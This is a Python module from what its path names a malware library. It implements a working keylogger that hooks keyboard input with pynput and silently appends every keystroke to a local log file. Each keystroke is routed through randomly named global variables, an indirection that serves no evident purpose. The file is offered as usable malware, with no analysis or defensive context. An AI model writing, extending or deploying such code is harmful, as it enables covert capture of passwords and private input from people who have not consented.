# my_malware_library/modules/keylogger.py
from pynput import keyboard
import os
import uuid

class Keylogger:
    def __init__(self, log_file="keylogs.txt"):
        self.log_file = log_file
        self.listener = None

    def start(self):
        def on_press(key):
            try:
                log_var = 'log_' + str(uuid.uuid4()).replace('-', '')
                globals()[log_var] = key.char
            except AttributeError:
                globals()[log_var] = ' [Special Key]'
            with open(self.log_file, 'a') as log_file:
                log_file.write(globals()[log_var])

        self.listener = keyboard.Listener(on_press=on_press)
        self.listener.start()

    def stop(self):
        if self.listener:
            self.listener.stop()
            self.listener = None